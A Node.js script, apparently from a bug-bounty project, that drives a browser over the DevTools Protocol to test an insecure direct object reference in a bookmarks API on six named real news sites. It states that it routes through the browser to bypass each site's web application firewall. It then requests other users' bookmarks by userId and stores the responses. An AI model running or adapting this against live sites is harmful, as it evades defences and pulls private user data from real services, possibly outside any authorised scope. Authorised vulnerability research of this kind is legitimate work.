// dpg_cross_brand.js — test bookmarks IDOR across all DPG Media brands.
// Uses browser (port 9224) to bypass WAF on each brand. Tests userId=1-3 on each.
const http = require('http');
const fs = require('fs');

function getJSON(port, p) {
  return new Promise((r, j) => {
    http.get({ host: '127.0.0.1', port, path: p }, c => {
      let d = '';
      c.on('data', x => d += x);
      c.on('end', () => r(JSON.parse(d)));
    }).on('error', j);
  });
}

function cdp(ws, m, p = {}) {
  return new Promise((r, j) => {
    const id = Math.floor(Math.random() * 1e9);
    const t = setTimeout(() => j(new Error('timeout')), 15000);
    const h = evt => {
      const msg = JSON.parse(evt.data);
      if (msg.id === id) { clearTimeout(t); ws.removeEventListener('message', h); msg.error ? j(new Error(JSON.stringify(msg.error))) : r(msg.result); }
    };
    ws.addEventListener('message', h);
    ws.send(JSON.stringify({ id, method: m, params: p }));
  });
}

async function main() {
  const PORT = 9224;
  const targets = await getJSON(PORT, '/json');
  let tab = targets.find(t => t.type === 'page');
  const ws = new WebSocket(tab.webSocketDebuggerUrl);
  await new Promise(r => ws.onopen = r);

  await cdp(ws, 'Page.enable');
  await cdp(ws, 'Runtime.enable');
  await cdp(ws, 'Network.enable');

  const brands = [
    { name: 'Parool', host: 'www.parool.nl' },
    { name: 'De Volkskrant', host: 'www.devolkskrant.nl' },
    { name: 'De Morgen', host: 'www.demorgen.be' },
    { name: 'Trouw', host: 'www.trouw.nl' },
    { name: 'AD', host: 'www.ad.nl' },
    { name: 'RTL Nieuws', host: 'www.rtlnieuws.nl' },
  ];

  const results = {};

  for (const brand of brands) {
    console.log(`\n=== ${brand.name} (${brand.host}) ===`);

    try {
      // Navigate to the brand
      await cdp(ws, 'Page.navigate', { url: `https://${brand.host}` });
      await new Promise(r => setTimeout(r, 5000));

      // Check if it loaded
      const title = await cdp(ws, 'Runtime.evaluate', {
        expression: 'document.title', returnByValue: true
      });
      console.log(`  title: ${title.result.value}`);

      // Test bookmarks with userId=1
      const test1 = await cdp(ws, 'Runtime.evaluate', {
        expression: `(async () => {
          const r = await fetch('https://${brand.host}/api/_next-api/bookmarks?userId=1');
          return r.status + ' | ' + (await r.text()).slice(0, 300);
        })()`,
        awaitPromise: true, returnByValue: true
      });
      console.log(`  userId=1: ${test1.result.value}`);

      // Test bookmarks with userId=2
      const test2 = await cdp(ws, 'Runtime.evaluate', {
        expression: `(async () => {
          const r = await fetch('https://${brand.host}/api/_next-api/bookmarks?userId=2');
          return r.status + ' | ' + (await r.text()).slice(0, 300);
        })()`,
        awaitPromise: true, returnByValue: true
      });
      console.log(`  userId=2: ${test2.result.value}`);

      // Check if build manifest exists
      const manifest = await cdp(ws, 'Runtime.evaluate', {
        expression: `(async () => {
          try {
            const r = await fetch('https://${brand.host}/_next/static/');
            return r.status + ' | ' + (await r.text()).slice(0, 200);
          } catch(e) { return 'error: ' + e.message; }
        })()`,
        awaitPromise: true, returnByValue: true
      });
      console.log(`  manifest: ${(manifest.result.value || '').slice(0, 150)}`);

      results[brand.name] = {
        host: brand.host,
        title: title.result.value,
        userId1: test1.result.value,
        userId2: test2.result.value,
      };

    } catch (e) {
      console.log(`  ERROR: ${e.message}`);
      results[brand.name] = { error: e.message };
    }

    // Pace: 3s between brands
    await new Promise(r => setTimeout(r, 3000));
  }

  fs.writeFileSync('findings/bounties/humo-h1/cross_brand_results.json', JSON.stringify(results, null, 2));
  console.log('\n=== Results saved to cross_brand_results.json ===');

  ws.close();
}

main().catch(e => { console.error(e); process.exit(1); });
